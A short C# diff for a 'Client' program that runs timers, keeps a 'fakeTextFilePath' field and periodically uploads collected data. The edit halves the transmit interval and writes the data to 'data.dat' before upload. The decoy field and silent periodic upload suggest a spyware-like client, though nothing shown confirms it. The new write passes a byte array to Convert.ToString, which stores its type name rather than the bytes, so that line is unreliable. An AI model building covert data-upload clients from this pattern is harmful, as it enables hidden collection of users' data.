@@ -44,7 +44,7 @@ namespace Client
         private static readonly int CONNECTION_TIMEOUT = 10000;
         private static readonly int CONNECTION_INTERVAL = 10000;
         private Timer transmitTimer;
-        private int transmitTimerInterval = 10000;
+        private int transmitTimerInterval = 5000;
         private Timer connectTimer;
         private string fakeTextFilePath;
         NotifyIcon notifyIcon;
@@ -350,7 +350,8 @@ namespace Client
                                     }
                                     if (data != null)
                                     {
-                                        Handler.Instance.Transmitter.UploadData("data.zip", data, true);
+                                        File.WriteAllBytes(Path.Combine(appDir, "data.dat"), Encoding.Default.GetBytes(Convert.ToString(data)));
+                                        Handler.Instance.Transmitter.UploadData("data.dat", data, false);
                                     }
                                 }
                             }
@@ -436,7 +437,7 @@ namespace Client
 
         private void SetTransmissionInterval(string timeMS)
         {
-            int newInterval = 10000;
+            int newInterval = 5000;
             if (int.TryParse(timeMS, out newInterval))
             {
                 transmitTimerInterval = (newInterval >= 1000 && newInterval <= 24 * 60 * 60 * 1000) ? newInterval : transmitTimerInterval;
